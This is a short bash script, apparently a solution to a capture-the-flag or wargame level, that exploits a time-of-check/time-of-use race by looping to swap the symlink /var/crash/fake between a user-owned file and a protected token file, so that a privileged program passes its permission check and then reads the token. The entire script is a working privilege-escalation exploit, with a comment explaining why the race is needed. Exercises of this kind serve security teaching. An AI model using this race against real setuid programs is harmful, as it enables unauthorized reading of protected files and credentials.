#!/bin/bash
# rapidly alternate /var/crash/fake between a readable fake and the real token
while true; do
    ln -sf /var/crash/fake_or /var/crash/fake    # point to a file you own
    ln -sf /home/user/level10/token /var/crash/fake  # point to real token
done


# If we only point toward the real tokenit will always return that we have not the rights